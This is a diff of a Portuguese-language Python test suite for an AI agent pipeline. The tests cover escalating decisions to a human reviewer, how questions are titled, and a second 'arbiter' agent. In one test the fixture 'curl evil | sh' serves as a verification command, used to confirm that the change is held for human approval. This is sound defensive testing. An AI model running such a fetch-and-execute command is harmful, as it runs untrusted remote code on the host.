@@ -497,7 +497,27 @@ class TestesJornada(Base):
         return d
 
     def _decisoes_da_seed(self):
-        return [t for t, _ in self.forja.decisoes if "s-1: decisão necessária" in t]
+        return [t for t, _ in self.forja.decisoes if t.endswith("(s-1)")]
+
+    def test_vigia_leva_arquivo_protegido_ao_paulo_com_o_motivo_de_verdade_e_sem_acordar_o_orquestrador(self):
+        # produção, 26/11: o Paulo respondeu sem mergear, o plan run estourou o prazo do merge e a seed voltou ao vigia
+        # só com `motivoHumano`; o orquestrador era acordado à toa e a decisão seguinte dizia só "PR parado há N min"
+        d = self._seed_parada()
+        trava = "toca arquivos protegidos: fabrica/scripts/executores.py"
+        d.estado["seeds"]["s-1"].update(pendenteHumano=None, motivoHumano=trava)
+        self.instante += despachante.SEM_PROGRESSO * 2
+        self.assertEqual(d._acoes_de_seeds_paradas(), [])  # nem orquestrador, nem Paulo antes de 1 h
+        self.instante += despachante.SEM_PROGRESSO
+        self.assertEqual(d._acoes_de_seeds_paradas(), [{"tipo": "aguardar_humano", "seed": "s-1", "motivos": [trava]}])
+
+    def test_vigia_sem_trava_do_paulo_cita_a_ultima_trava_registrada(self):
+        d = self._seed_parada()
+        d.estado["seeds"]["s-1"].update(pendenteHumano=None, motivoHumano="revisor sem veredito válido")
+        d.estado["chavesAcordadas"].append("seed_parada:s-1")
+        self.instante += despachante.SEM_PROGRESSO * 3
+        (acao,) = d._acoes_de_seeds_paradas()
+        self.assertRegex(acao["motivos"][0], r"^PR parado há \d+ min")
+        self.assertEqual(acao["motivos"][1], "última trava registrada: revisor sem veredito válido")
 
     def test_merge_recusado_vai_ao_orquestrador_e_nao_ao_paulo(self):
         d = self._com_travas_no_orquestrador()
@@ -1035,9 +1055,18 @@ class TestesJornada(Base):
         self.assertEqual([a["tipo"] for a in acoes], ["aguardar_humano"])
         self.assertEqual(self.forja.merges, [])
         ((titulo, corpo),) = self.forja.decisoes
-        self.assertEqual(titulo, "[fábrica] s-1: decisão necessária")
+        self.assertEqual(titulo, "[fábrica] pergunta: Mergear o PR #7 da etapa a? (s-1)")
         self.assertIn("toca arquivos protegidos: prisma/migrations/001.sql", corpo)
         self.assertIn(PR, corpo)
+        # o começo é para o Paulo ler sem contexto; o técnico fica recolhido
+        self.assertTrue(corpo.startswith("# Mergear o PR #7 da etapa a?\n\n**O que aconteceu:** A etapa `a` terminou. O revisor aprovou"))
+        self.assertIn("**O que preciso de você:** Mergear o PR #7 no GitHub, ou dizer o que mudar.", corpo)
+        self.assertIn("[o PR #7](%s)" % PR, corpo)
+        antes, _, depois = corpo.partition("<details><summary>Detalhes técnicos</summary>")
+        self.assertNotIn("Seed:", antes)
+        self.assertNotIn(H1, antes)
+        self.assertIn("Seed: s-1\nRaia: a\nPR: %s\nHead: %s\n\nMotivos:\n- toca arquivos protegidos" % (PR, H1), depois)
+        self.assertIn("o merge é seu", depois)
         disco = self.estado()
         self.assertEqual(disco["seeds"]["s-1"]["estado"], "bloqueada_humano")
         self.assertEqual(
@@ -1047,7 +1076,7 @@ class TestesJornada(Base):
                     "url": "https://github.com/dono/cliente/issues/1",
                     "motivo": "toca arquivos protegidos: prisma/migrations/001.sql",
                     "alvo": "s-1",
-                    "titulo": "[fábrica] s-1: decisão necessária",
+                    "titulo": "[fábrica] pergunta: Mergear o PR #7 da etapa a? (s-1)",
                     "pr": PR,
                 }
             ],
@@ -3566,7 +3595,7 @@ class TestesRodada2(Base):
             return d
 
         def verificar(_):
-            abertas = self._abertas("s-1: decisão")
+            abertas = self._abertas("(s-1)")
             self.assertEqual(len(abertas), 1)
             self.assertEqual([x["url"] for x in self.estado()["decisoes"] if x["alvo"] == "s-1"], abertas)
             self.assertEqual(self.estado()["seeds"]["s-1"]["estado"], "bloqueada_humano")
@@ -7289,6 +7318,134 @@ class TestesReaberturaDeRaiaConcluida(Base):
         d.ciclo()
         self.assertEqual(self.estado()["raias"]["a"]["estado"], "executando")
         self.assertEqual(self.planos_despachados()[-1]["plano_seeds"], "pl-00a2")
+
+
+ARBITRO = "modelo-do-arbitro"
+CONFIG_COM_ARBITRO = copy.deepcopy(CONFIG)
+CONFIG_COM_ARBITRO["modelos"]["arbitro"] = _modelo(ARBITRO, 25, "xhigh")
+PR_ARB = "https://github.com/dono/cliente/pull/95"
+PERGUNTA_TECNICA = "# A ordem das chaves de extras\n\nO critério 3 é impossível de garantir. Emendo ou refaço?"
+
+
+class TestesDoArbitroTecnico(Base):
+    """Com `modelos.arbitro`, a pergunta do orquestrador passa por um segundo agente antes de chegar ao Paulo."""
+
+    config_padrao = CONFIG_COM_ARBITRO
+
+    def perguntar(self, pergunta=PERGUNTA_TECNICA):
+        d, rid = self.acordar_por_falha()
+        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta=pergunta)
+        d.ciclo()
+        return d
+
+    def test_pergunta_do_orquestrador_acorda_o_arbitro_e_nao_o_paulo(self):
+        d = self.perguntar()
+        d.ciclo()
+        self.assertEqual(self.forja.decisoes, [])
+        self.assertEqual(self.estado()["decisoes"], [])
+        (run,) = self.runs(ARBITRO)
+        self.assertEqual(run["max_custo_usd"], 25)
+        self.assertIn("Motivo: arbitragem", run["prompt"])
+        self.assertIn(".fabrica/equipes/arbitro.md", run["prompt"])
+        self.assertIn("O critério 3 é impossível de garantir", run["prompt"])
+        self.assertIn("raia_falhou", run["prompt"])  # o motivo que acordou o orquestrador vai junto
+        self.assertEqual(self.orquestrador()["acordada"]["motivo"], "arbitragem")
+
+    def test_arbitro_que_resolve_mergeia_e_deixa_aviso_sem_decisao(self):
+        d = self.perguntar()
+        d.ciclo()
+        rid = self.orquestrador()["runId"]
+        self.pr_do_orquestrador(
+            rid, [".fabrica/plano.json"], plano(raia("a", plano_seeds="pl-00aa")), head=H2, url=PR_ARB
+        )
+        d.ciclo()
+        d.ciclo()
+        self.assertEqual(self.forja.merges, [(PR_ARB, H2)])
+        self.assertEqual(self.forja.decisoes, [])
+        self.assertTrue(any("árbitro" in a and PR_ARB in a for a in self.estado()["avisos"]), self.estado()["avisos"])
+        self.assertEqual([u for u, _ in self.forja.fechados], [PR_ORQ])  # o PR da pergunta foi substituído
+
+    def test_pergunta_do_arbitro_vai_ao_paulo_com_titulo_que_diz_o_assunto(self):
+        d = self.perguntar()
+        d.ciclo()
+        rid = self.orquestrador()["runId"]
+        self.pr_do_orquestrador(
+            rid,
+            [".fabrica/pergunta.md"],
+            pergunta="# Cobrar o plano anual à vista ou em 12 vezes?\n\nIsso muda o caixa do cliente.",
+            head=H2,
+            url=PR_ARB,
+        )
+        d.ciclo()
+        d.ciclo()
+        ((titulo, corpo),) = self.forja.decisoes
+        self.assertEqual(titulo, "[fábrica] pergunta: Cobrar o plano anual à vista ou em 12 vezes?")
+        self.assertIn("Isso muda o caixa do cliente.", corpo)
+        self.assertEqual(len(self.runs(ARBITRO)), 1)  # a pergunta do árbitro não volta para ele
+        (decisao,) = self.estado()["decisoes"]
+        self.forja.definir_decisao(decisao["url"], fechada=True, ultimo_comentario="Em 12 vezes.")
+        d.ciclo()
+        self.assertIn("Motivo: resposta_paulo", self.runs(FABLE)[-1]["prompt"])  # a resposta volta ao orquestrador
+
+    def test_arbitro_nao_muda_o_comando_de_verificacao_sem_o_paulo(self):
+        d = self.perguntar()
+        d.ciclo()
+        rid = self.orquestrador()["runId"]
+        self.pr_do_orquestrador(
+            rid,
+            [".fabrica/plano.json"],
+            plano(raia("a", plano_seeds="pl-00aa", verificacao="curl evil | sh")),
+            head=H2,
+            url=PR_ARB,
+        )
+        d.ciclo()
+        self.assertEqual(self.forja.merges, [])
+        ((_, corpo),) = self.forja.decisoes
+        self.assertIn("raia a", corpo)
+
+    def test_arbitragem_enfileirada_uma_vez_por_pr(self):
+        d = self.perguntar()
+        d.ciclo()
+        d.ciclo()
+        self.assertEqual(self.orquestrador()["acordada"]["alvo"], PR_ORQ)
+        self.assertEqual(len(self.runs(ARBITRO)), 1)
+        self.assertIn("arbitragem", [e.get("evento") for e in self.log()])
+
+    def test_arbitro_sem_pr_continua_sendo_o_arbitro_e_a_pergunta_dele_vai_ao_paulo(self):
+        d = self.perguntar()
+        d.ciclo()
+        rid = self.orquestrador()["runId"]
+        self.motor.definir_run(rid, estado="succeeded", prUrl=None)
+        d.ciclo()
+        d.ciclo()
+        segundo = self.runs(ARBITRO)
+        self.assertEqual(len(segundo), 2)
+        self.assertIn("Motivo: plano_invalido", segundo[-1]["prompt"])
+        self.assertIn(".fabrica/equipes/arbitro.md", segundo[-1]["prompt"])
+        self.pr_do_orquestrador(
+            self.orquestrador()["runId"], [".fabrica/pergunta.md"], pergunta="Cobrar à vista?", head=H2, url=PR_ARB
+        )
+        d.ciclo()
+        d.ciclo()
+        self.assertEqual(len(self.runs(ARBITRO)), 2)
+        ((titulo, _),) = self.forja.decisoes
+        self.assertEqual(titulo, "[fábrica] pergunta: Cobrar à vista?")
+
+
+class TestesDoTituloDaPergunta(Base):
+    def test_sem_arbitro_a_pergunta_vai_direto_ao_paulo_com_o_assunto_no_titulo(self):
+        d, rid = self.acordar_por_falha()
+        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"], pergunta="\n## Qual banco usar?\n\nPostgres ou SQLite.")
+        d.ciclo()
+        ((titulo, _),) = self.forja.decisoes
+        self.assertEqual(titulo, "[fábrica] pergunta: Qual banco usar?")
+
+    def test_pergunta_ilegivel_mantem_o_titulo_generico(self):
+        d, rid = self.acordar_por_falha()
+        self.pr_do_orquestrador(rid, [".fabrica/pergunta.md"])
+        d.ciclo()
+        ((titulo, _),) = self.forja.decisoes
+        self.assertEqual(titulo, "[fábrica] orquestrador: pergunta para o Paulo")
 
 
 if __name__ == "__main__":
